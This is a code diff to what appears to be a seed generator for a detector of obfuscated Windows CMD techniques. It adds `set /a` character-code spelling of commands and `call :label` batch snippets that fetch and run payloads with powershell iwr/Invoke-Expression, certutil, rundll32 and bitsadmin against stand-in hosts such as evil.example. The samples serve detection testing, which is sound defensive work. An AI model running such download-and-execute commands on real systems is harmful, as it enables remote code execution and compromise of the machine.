@@ -41,6 +41,12 @@ const CMD_TECHNIQUE_CATALOG = Object.freeze([
   'CMD for /f Indirect Execution',
   'CMD for /f Indirect Execution (partial)',
   'CMD ClickFix Wrapper',
+  // ── Phase 1 additions ────────────────────────────────────────────
+  // `set /a X=<num>` block whose per-variable ASCII codepoints spell
+  // a command + `call :label <args>` indirection whose body names a
+  // LOLBin. See AGENTS.md pain-points (Phase 1 pending SHAs).
+  'CMD set /a Arithmetic-to-Character',
+  'CMD call :label Indirection',
 ]);
 
 // Tiny xorshift32 PRNG — deterministic per seed, no Math.random.
@@ -282,6 +288,67 @@ function genForFIndirect() {
 }
 
 
+// ── Phase 1 additions ─────────────────────────────────────────────────────
+
+function genSetAArithmetic() {
+  // A block of `set /a X=<num>` assigns whose per-variable values
+  // spell a command when concatenated. `set /a` only accepts numeric
+  // literals (decimal / 0xHH) to stay inside the single-integer
+  // branch of the decoder — expressions like `%X%+1` are ignored.
+  const out = [];
+  const cmds = ['whoami', 'powershell', 'certutil', 'rundll32'];
+  for (const cmd of cmds) {
+    // Decimal form
+    const dec = cmd.split('').map((c, i) => `set /a V${i}=${c.charCodeAt(0)}`).join(' & ');
+    out.push(makeSeed(`${dec} & echo done`, cmd));
+    // Hex form (mix) — exercises the 0xNN parse path
+    const hex = cmd.split('').map((c, i) => `set /a V${i}=0x${c.charCodeAt(0).toString(16)}`).join(' & ');
+    out.push(makeSeed(`${hex}\n`, cmd));
+    // Quoted form (`set /a "X=N"`) — exercises the quoted-assign branch
+    const quoted = cmd.split('').map((c, i) => `set /a "V${i}=${c.charCodeAt(0)}"`).join('\n');
+    out.push(makeSeed(`${quoted}\n`, cmd));
+  }
+  return out;
+}
+
+function genCallLabelIndirection() {
+  // `call :<label>` + `:<label>` definition body that names a LOLBin.
+  const out = [];
+  out.push(makeSeed(
+    [
+      '@echo off',
+      'call :runit',
+      'goto :eof',
+      ':runit',
+      'powershell.exe -NoProfile -Command "Invoke-Expression (iwr http://e/p)"',
+      'goto :eof',
+    ].join('\n'),
+    'powershell',
+  ));
+  out.push(makeSeed(
+    [
+      '@echo off',
+      'call :a',
+      'call :b "http://evil.example/p.exe"',
+      ':a',
+      'certutil -urlcache -f http://e/p.exe p.exe',
+      ':b',
+      'rundll32.exe %1,DllRegisterServer',
+    ].join('\n'),
+    'certutil',
+  ));
+  out.push(makeSeed(
+    [
+      ':fetch',
+      'bitsadmin /transfer j /priority normal http://e/p.exe %TEMP%\\p.exe',
+      'call :fetch',
+    ].join('\n'),
+    'bitsadmin',
+  ));
+  return out;
+}
+
+
 function generateCmdSeeds() {
   const rng = makeRng(0xC1D5EED0);
   return [
@@ -292,6 +359,9 @@ function generateCmdSeeds() {
     ...genArgv0(),
     ...genForFIndirect(),
     ...genClickFix(),
+    // Phase 1 additions
+    ...genSetAArithmetic(),
+    ...genCallLabelIndirection(),
   ];
 }
 
